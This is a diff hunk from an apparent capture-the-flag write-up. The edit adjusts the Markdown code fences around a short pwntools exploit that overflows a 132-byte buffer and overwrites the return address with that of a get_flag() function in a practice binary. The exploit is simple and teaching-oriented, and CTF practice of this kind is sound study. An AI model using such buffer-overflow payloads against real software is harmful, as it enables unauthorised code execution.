@@ -37,12 +37,12 @@ we can see get_flag() function. i disassembled it using the pdf command
 \           0x080485c1      c3             ret
 ```
 So we can directly call the function to get the flag using this simple exploit
-```
+```python
 from pwn import *
 expl = cyclic(132)
 expl += p32(0x080485a2) # get_flag() address
 print expl
-
+```
 # python begin.py | ./begin
 overflow me --_--
 
